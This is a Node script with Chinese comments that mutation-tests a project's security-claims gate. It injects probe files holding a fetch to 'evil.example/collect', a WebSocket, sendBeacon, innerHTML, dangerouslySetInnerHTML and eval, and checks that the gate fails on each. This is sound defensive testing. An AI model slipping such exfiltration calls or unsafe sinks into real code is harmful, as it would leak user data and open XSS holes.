/**
 * security-claims.mjs 的变异验证。
 *
 * 重点是证明「数据不出设备」这条最强承诺真的会被门禁守住 ——
 * 往生产代码里注入一个网络请求，门禁必须变红。
 */
import { readFileSync, writeFileSync, existsSync, unlinkSync } from 'node:fs';
import { spawnSync } from 'node:child_process';

const PROBE = 'src/lib/__net-probe.ts';
const PROBE_TEST = 'src/lib/__net-probe.test.ts';
const STORAGE = 'src/lib/storage.ts';
const storageOrig = readFileSync(STORAGE, 'utf8');
let checks = 0;
let failures = 0;

function check(name, ok, detail) {
  checks += 1;
  if (ok) console.log('  ✓ ' + name);
  else { failures += 1; console.error('  ✗ ' + name + (detail ? ' — ' + detail : '')); }
}
function runGate() {
  const r = spawnSync(process.execPath, ['scripts/audit/security-claims.mjs'], { encoding: 'utf8' });
  return { code: r.status ?? 1, out: String(r.stdout ?? '') + String(r.stderr ?? '') };
}

/**
 * 清理：**只删，不写**。
 *
 * ── 这里曾经有一个真实的 bug，把空文件泄漏进了仓库 ──────────────
 *
 * 第一版的 cleanup() 长这样：
 *
 *   function cleanup() {
 *     try { writeFileSync(PROBE, '', 'utf8'); } catch { ... }   // ← 罪魁
 *     try { if (fs.existsSync(PROBE)) unlinkSync(PROBE); } catch { ... }
 *     ...
 *   }
 *
 * 那句 `writeFileSync(PROBE, '')` 是我原本想"至少别留下带 fetch 的文件"
 * （怕它在清理失败时污染门禁）。结果是：**删失败时留下的是一个 0 字节文件**。
 *
 * 而且它真的发生了 —— `git commit -a` 把 `src/lib/__net-probe.ts`
 * （空文件）提交进了仓库。
 *
 * 教训有两层：
 *
 * 1. **清理逻辑不要"写"**。写操作会让"删失败"从"残留旧内容"
 *    恶化成"残留一个看似合法的新文件"，而且更难发现。
 * 2. **自测必须自己检查有没有留痕**。原来我只在最后断言一次
 *    `!existsSync(PROBE)`，但那只在正常路径跑到；一旦中途抛异常，
 *    这个断言本身也不会执行。
 *
 * 现在：只 unlink、绝不 write；并且在 `process.on('exit')` 里
 * 再查一遍并把结果打到 stderr（退出码改不了，但至少看得见）。
 */
function cleanup() {
  for (const p of [PROBE, PROBE_TEST]) {
    try {
      if (existsSync(p)) unlinkSync(p);
    } catch {
      /* 删不掉就让它显形，不要静默 */
      console.error('⚠️ 残留文件未清理：' + p);
    }
  }
  writeFileSync(STORAGE, storageOrig, 'utf8');
}
process.on('exit', cleanup);

console.log('');
console.log('变异验证：SECURITY.md 安全声明门禁');
console.log('');

{
  const r = runGate();
  check('基线全绿', r.code === 0, 'exit=' + r.code);
}

/* 变异 1：往生产代码里注入 fetch —— 直接违背「数据不出设备」 */
{
  writeFileSync(PROBE, 'export const send = () => fetch("https://evil.example/collect");\n', 'utf8');
  const r = runGate();
  check('注入 fetch 门禁变红', r.code !== 0, 'exit=' + r.code);
  check('  报出网络请求那条', /网络请求/.test(r.out), r.out.slice(-300));
  check('  指出具体文件', /__net-probe\.ts/.test(r.out), r.out.slice(-300));
  unlinkSync(PROBE);
}

/* 变异 2：注入 WebSocket */
{
  writeFileSync(PROBE, 'export const ws = () => new WebSocket("wss://evil.example");\n', 'utf8');
  const r = runGate();
  check('注入 WebSocket 门禁变红', r.code !== 0, 'exit=' + r.code);
  unlinkSync(PROBE);
}

/* 变异 3：注入 sendBeacon */
{
  writeFileSync(PROBE, 'export const b = () => navigator.sendBeacon("/x", "data");\n', 'utf8');
  const r = runGate();
  check('注入 sendBeacon 门禁变红', r.code !== 0, 'exit=' + r.code);
  unlinkSync(PROBE);
}

/* 变异 4：注入 dangerouslySetInnerHTML（XSS 声明）*/
{
  writeFileSync(PROBE, 'export const El = () => null;\n// dangerouslySetInnerHTML\n', 'utf8');
  const r = runGate();
  check('代码里出现 dangerouslySetInnerHTML 字样时门禁变红', r.code !== 0, 'exit=' + r.code);
  unlinkSync(PROBE);
}

/* 变异 5：注入 .innerHTML = */
{
  writeFileSync(PROBE, 'export const f = (el: HTMLElement) => { el.innerHTML = "<b>x</b>"; };\n', 'utf8');
  const r = runGate();
  check('注入 .innerHTML 赋值门禁变红', r.code !== 0, 'exit=' + r.code);
  unlinkSync(PROBE);
}

/* 变异 6：注入 eval */
{
  writeFileSync(PROBE, 'export const e = (s: string) => eval(s);\n', 'utf8');
  const r = runGate();
  check('注入 eval 门禁变红', r.code !== 0, 'exit=' + r.code);
  unlinkSync(PROBE);
}

/* 变异 7：测试文件里的 fetch 不应误报（测试要 mock 网络，合法）*/
{
  writeFileSync('src/lib/__net-probe.test.ts', 'export const t = () => fetch("https://example.com");\n', 'utf8');
  const r = runGate();
  check('测试文件里的 fetch 不误报（排除 *.test.*）', r.code === 0, 'exit=' + r.code + ' ' + r.out.slice(-200));
  unlinkSync(PROBE_TEST);
}

{
  const r = runGate();
  check('恢复后全绿', r.code === 0, 'exit=' + r.code);
  check('storage.ts 逐字节还原', readFileSync(STORAGE, 'utf8') === storageOrig);
  check('探针文件已清理', !existsSync(PROBE));
}

console.log('');
if (failures > 0) { console.error('✗ ' + failures + ' / ' + checks + ' 项失败'); process.exit(1); }
console.log('✓ ' + checks + ' 项：「数据不出设备」与 XSS 的三条防线都真的会红');
